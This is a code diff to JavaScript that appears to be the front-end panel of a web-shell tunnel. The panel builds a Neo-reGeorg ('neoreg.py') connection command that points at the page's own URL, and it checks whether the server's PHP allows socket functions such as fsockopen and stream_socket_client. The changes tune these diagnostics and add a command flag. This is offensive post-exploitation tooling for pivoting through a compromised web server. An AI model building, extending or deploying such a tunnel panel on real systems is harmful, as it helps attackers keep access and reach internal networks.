@@ -5,7 +5,7 @@
   if (urlEl) {
     const tunnelUrl = location.origin + location.pathname;
     urlEl.value = tunnelUrl;
-    cmdEl.textContent = 'python3 neoreg.py -u ' + tunnelUrl + ' -k <password>';
+    cmdEl.textContent = 'python3 neoreg.py -u ' + tunnelUrl + ' -k <password> --skip';
   }
 })();
 
@@ -21,16 +21,16 @@ function tunnelCheck() {
   fetchJSON(fd)
     .then(d => {
       const funcs = d.functions || {};
-      const hasSock = funcs['fsockopen'] || funcs['popen'] || funcs['proc_open'];
+      const hasSock = funcs['fsockopen'] || funcs['stream_socket_client'];
       const row = (label, ok, detail) => {
         const badge = ok ? '<span class="badge badge-ok">\u2714</span>' : '<span class="badge badge-no">\u2716</span>';
         return '<div class="diag-item"><span class="diag-label">' + label + '</span><span class="diag-value">' + badge + ' ' + escHtml(String(detail || '')) + '</span></div>';
       };
       let html = '';
       html += row('fsockopen', funcs['fsockopen'], funcs['fsockopen'] ? 'available' : 'disabled');
-      html += row('stream_socket_client', !d.disable_functions.includes('stream_socket_client'), 'check disable_functions');
+      html += row('stream_socket_client', funcs['stream_socket_client'], funcs['stream_socket_client'] ? 'available' : 'disabled');
       html += '<div class="diag-item"><span class="diag-label">open_basedir</span><span class="diag-value">' + escHtml(d.open_basedir) + '</span></div>';
-      html += '<div class="diag-item"><span class="diag-label">max_execution_time</span><span class="diag-value">' + escHtml(String(d.disable_functions !== 'none' ? 'has restrictions' : 'none')) + '</span></div>';
+      html += '<div class="diag-item"><span class="diag-label">max_execution_time</span><span class="diag-value">' + escHtml(String(d.max_execution_time || 'unknown')) + '</span></div>';
       reqsEl.innerHTML = html;
 
       if (hasSock) {
